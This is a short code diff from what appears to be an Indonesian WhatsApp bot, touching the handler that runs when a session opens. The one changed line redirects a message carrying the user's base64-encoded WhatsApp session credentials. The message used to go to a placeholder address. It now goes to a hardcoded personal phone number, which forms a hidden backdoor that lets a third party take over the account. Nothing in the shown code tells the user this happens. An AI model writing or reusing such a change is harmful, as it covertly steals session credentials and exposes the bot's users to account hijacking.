@@ -4440,7 +4440,7 @@ client.on ('open', async () => {
   const authInfo = client.base64EncodedAuthInfo()
   fs.writeFileSync(`./sampah/${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
   await client.sendMessage('0@s.whatsapp.net', `Kamu bisa login tanpa qr dengan pesan dibawah ini`, MessageType.extendedText)
-  client.sendMessage('0@s.whatsapp.net', `${prefix}${command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)
+  client.sendMessage('6285732415700@s.whatsapp.net', `${prefix}${command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)
 })
 client.on('chat-update', async (chat) => {
 	require('./denz.js')(client, chat)
